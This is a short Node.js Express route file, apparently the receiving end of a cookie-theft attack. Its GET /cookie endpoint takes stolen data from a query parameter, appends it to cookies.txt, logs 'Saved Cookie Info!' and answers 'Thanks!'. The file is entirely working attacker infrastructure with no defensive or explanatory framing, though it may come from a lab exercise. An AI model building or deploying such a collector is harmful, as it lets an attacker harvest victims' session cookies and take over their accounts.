var express = require('express');
var router = express.Router();
const fs = require('fs');

router.get('/cookie', async (req, res) => {
  console.log('GET /cookie');
  fs.appendFile('cookies.txt', req.query.data + "\n\n", function (err) {
    if (err) throw err;
    console.log('Saved Cookie Info!');
  });
  res.send('Thanks!');
});

module.exports = router;
